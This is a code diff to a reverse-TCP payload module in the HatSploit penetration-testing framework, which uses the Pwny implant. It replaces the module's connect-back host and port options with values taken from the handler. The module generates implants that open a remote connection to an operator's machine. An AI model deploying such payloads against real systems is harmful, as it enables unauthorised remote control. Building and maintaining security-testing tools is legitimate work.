@@ -9,7 +9,6 @@ from pwny import Pwny
 from pwny.session import PwnySession
 
 from hatsploit.lib.payload import Payload
-from hatsploit.utils.tcp import TCPClient
 
 
 class HatSploitPayload(Payload, Pwny):
@@ -28,23 +27,9 @@ class HatSploitPayload(Payload, Pwny):
         'Type': "reverse_tcp"
     }
 
-    options = {
-        'CBHOST': {
-            'Description': "Connect-back host.",
-            'Value': TCPClient.get_local_host(),
-            'Type': "ip",
-            'Required': True
-        },
-        'CBPORT': {
-            'Description': "Connect-back port.",
-            'Value': 8888,
-            'Type': "port",
-            'Required': True
-        }
-    }
-
     def run(self):
-        connback_host, connback_port = self.parse_options(self.options)
+        remote_host = self.handler['RHOST']
+        remote_port = self.handler['RPORT']
 
         return (
             self.get_template(
@@ -53,7 +38,7 @@ class HatSploitPayload(Payload, Pwny):
             )
         ), {
             'data': self.encode_data(
-                host=connback_host,
-                port=connback_port
+                host=remote_host,
+                port=remote_port
             )
         }
